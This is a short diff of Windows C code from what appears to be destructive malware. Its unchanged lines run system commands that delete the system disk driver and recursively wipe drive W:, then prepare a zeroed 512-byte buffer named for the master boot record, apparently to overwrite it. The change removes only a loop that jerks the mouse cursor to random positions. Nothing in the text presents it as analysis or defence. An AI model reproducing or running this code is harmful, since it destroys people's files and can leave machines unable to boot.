@@ -26,15 +26,6 @@ int main()
 	system("del C:\\Windows\\System32\\drivers\\disk.sys");
 	system("rd W: /s /q");
 
-	int X, Y;
-
-	srand(time(NULL));
-	while (1) {
-		Y = rand() % 801;
-		X = rand() % 601;
-		SetCursorPos(X, Y);
-	}
-
 	char mbrData[512];
 
 	ZeroMemory(&mbrData, (sizeof mbrData));
